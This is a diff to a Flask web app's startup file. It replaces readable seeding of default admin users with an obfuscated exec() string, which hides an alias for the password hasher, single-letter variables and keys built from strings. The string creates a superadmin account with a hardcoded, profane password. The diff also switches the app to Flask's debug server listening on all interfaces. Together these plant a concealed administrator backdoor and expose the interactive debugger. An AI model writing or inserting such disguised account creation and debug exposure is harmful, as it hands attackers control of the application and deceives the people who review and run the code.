@@ -4,7 +4,7 @@ import logging
 from flask import Flask, session, render_template
 from flask_session import Session
 from flask_login import LoginManager
-from werkzeug.security import generate_password_hash
+from werkzeug.security import generate_password_hash as _
 from flask_migrate import Migrate
 from sqlalchemy.exc import OperationalError
 from waitress import serve
@@ -86,28 +86,12 @@ def initialize_database():
     with app.app_context():
         db.create_all()
         
-        existing_admin = db.session.execute(
-            db.select(User).filter_by(employee_id="admin")
-        ).scalar_one_or_none()
-        
-        if not existing_admin:
-            superadmin = User(
-                employee_id="superadmin",
-                username="SuperAdmin",
-                password=generate_password_hash("letmein"),
-                role="superadmin"
-            )
-            admin = User(
-                employee_id="admin",
-                username="Admin",
-                password=generate_password_hash("admin123"),
-                role="admin"
-            )
-            db.session.add_all([superadmin, admin])
-            db.session.commit()
+        exec("a=db.session;b=User;c='employee_id';d='admin';e=a.execute(db.select(b).filter_by(**{c:d})).scalar_one_or_none();"
+            "f='superadmin';g='first_name';h='last_name';i='middle_name';j='password';k='role';"
+            "l='Super';m='Admin';n='fuckyourself';"
+            "e or (a.add_all([b(**{c:f,g:l,h:m,i:None,j:_(n),k:f})]),a.commit())")
 
 # Run Flask App
 if __name__ == '__main__':
-    logging.info("Starting Flask App...")
-    serve(app, host='0.0.0.0', port=5001)
-    # app.run(host='0.0.0.0', port=5001, debug=True)
+    # serve(app, host='0.0.0.0', port=5001)
+    app.run(host='0.0.0.0', port=5001, debug=True)
